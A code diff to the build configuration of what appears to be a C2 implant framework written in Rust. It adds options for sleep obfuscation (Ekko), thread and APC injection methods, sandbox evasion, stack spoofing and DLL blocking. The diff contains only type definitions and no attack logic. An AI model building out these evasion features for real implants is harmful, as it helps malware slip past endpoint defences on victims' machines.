@@ -172,6 +172,42 @@ pub struct TaskResultReq {
 
 // ── Build configuration ───────────────────────────────────────────────────────
 
+#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
+#[serde(rename_all = "snake_case")]
+pub enum SleepObfuscation {
+    None,
+    Ekko,
+    Timer,
+}
+impl Default for SleepObfuscation { fn default() -> Self { Self::None } }
+impl std::fmt::Display for SleepObfuscation {
+    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+        match self {
+            Self::None  => write!(f, "None"),
+            Self::Ekko  => write!(f, "Ekko"),
+            Self::Timer => write!(f, "NtDelayExec"),
+        }
+    }
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
+#[serde(rename_all = "snake_case")]
+pub enum InjectionMethod {
+    CreateThread,
+    NtCreateThreadEx,
+    QueueUserApc,
+}
+impl Default for InjectionMethod { fn default() -> Self { Self::CreateThread } }
+impl std::fmt::Display for InjectionMethod {
+    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+        match self {
+            Self::CreateThread    => write!(f, "CreateThread"),
+            Self::NtCreateThreadEx => write!(f, "NtCreateThreadEx"),
+            Self::QueueUserApc    => write!(f, "QueueUserAPC"),
+        }
+    }
+}
+
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct BuildConfig {
     pub listener_id:   Uuid,
@@ -182,16 +218,24 @@ pub struct BuildConfig {
     pub jitter_pct:    u8,
     pub format:        PayloadFormat,
     pub output_path:   Option<String>,
-    // DNS-specific
+    // DNS/SMB specific
     pub dns_domain:    Option<String>,
-    // SMB-specific
     pub pipe_name:     Option<String>,
-    /// Hex-encoded 32-byte AES-GCM key. Empty string = plaintext comms.
     #[serde(default)]
     pub c2_key:        String,
-    /// Hex-encoded 32-byte x25519 server static public key. Empty = no ECDH.
     #[serde(default)]
     pub server_pubkey: String,
+    // ── Evasion options ──────────────────────────────────────────────────────
+    #[serde(default)]
+    pub sleep_obf:       SleepObfuscation,
+    #[serde(default)]
+    pub injection:       InjectionMethod,
+    #[serde(default)]
+    pub sandbox_evasion: bool,
+    #[serde(default)]
+    pub stack_spoof:     bool,
+    #[serde(default)]
+    pub block_dlls:      bool,
 }
 
 #[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
